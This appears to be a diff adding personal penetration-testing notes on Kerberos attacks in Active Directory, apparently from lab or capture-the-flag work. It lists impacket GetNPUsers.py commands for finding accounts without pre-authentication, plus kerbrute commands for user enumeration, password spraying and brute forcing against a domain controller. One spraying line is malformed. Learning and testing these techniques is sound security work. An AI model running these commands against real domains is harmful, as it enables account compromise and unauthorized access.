@@ -1,0 +1,11 @@
+#### Kerberos-sec
+- can use impacket GetNpUsers.py to see if any users have kerberos pre-auth disabled
+  - `GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'`
+  - Kerbrute
+    - `./kerbrute_linux_amd64 userenum - domain.local --dc {ip} users.txt`
+    - `./kerbrute_linux_amd64 passwordspray --dc {ip} -d domain.local users.txt Password@10.10.10.10
+    - `kerbrute userenum --dc [DC] -d [domain] [userlist]`
+    - `kerbrute passwordspray --dc [DC] -d [domain] [userlist] [password]`
+    - `kerbrute bruteuser --dc [DC] -d [domain] [passlist] [user]`
+    - `kerbrute bruteforce --dc [DC] -d [domain] [credslist]`
+    - credslist contains [user]:[pass] on each line
